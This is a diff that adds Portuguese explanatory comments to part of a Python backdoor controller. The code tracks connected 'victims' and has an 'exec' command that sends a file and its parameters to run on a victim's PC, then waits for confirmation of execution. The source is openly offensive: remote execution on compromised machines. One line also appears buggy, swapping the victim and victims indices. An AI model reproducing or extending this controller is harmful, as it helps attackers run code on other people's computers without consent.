@@ -122,7 +122,7 @@ if __name__ == '__main__':
 
                     if '\r' in response:  # 43: O caractere '\r' mostra que o socket da vítima levou timeout mas permanece ativo.
                         print(victims[victim].sock.recv(26))  # 44
-                    else:  # 45
+                    else:  # 45: Para o caso de não levar o timeout.
                         print(response)
 
                 except IndexError:  # 46
@@ -133,24 +133,24 @@ if __name__ == '__main__':
 
             elif command.startswith('exec'):
                 try:  # 48
-                    cmd = command.split()[1:]  # 49
+                    cmd = command.split()[1:]  # 49: Define qual será o arquivo a ser executado no PC da vítima.
 
                     if len(cmd) < 1:  # 50
                         raise IndexError  # 51
 
-                    victim[victims].sock.send(command)  # 52
+                    victim[victims].sock.send(command)  # 52: Envia para o PC da vítima o arquivo a ser executado.
 
                 except IndexError:  # 53
                     print('Usage: exec <file> <parameters>')
                     print('E.g: exec sshd.exe -d')
 
                 else:  # 54
-                    result = victims[victim].sock.recv(28)
+                    result = victims[victim].sock.recv(28)  # 55: Recebe da vítima 28 bytes confirmando a execução do arquivo.
 
-                    if not result:  # 55
+                    if not result:  # 56: Não terá conteúdo no caso do backdoor parar de executar no PC da vítima.
                         raise socket.error  # 57
                     elif '\r' in result:  # 58
-                        print(victims[victim].sock.recv(28))  # 59
+                        print(victims[victim].sock.recv(28))  # 59: Aguarda o backdoor enviar a informação pós timeout.
                     else:  # 60
                         print(result)
 
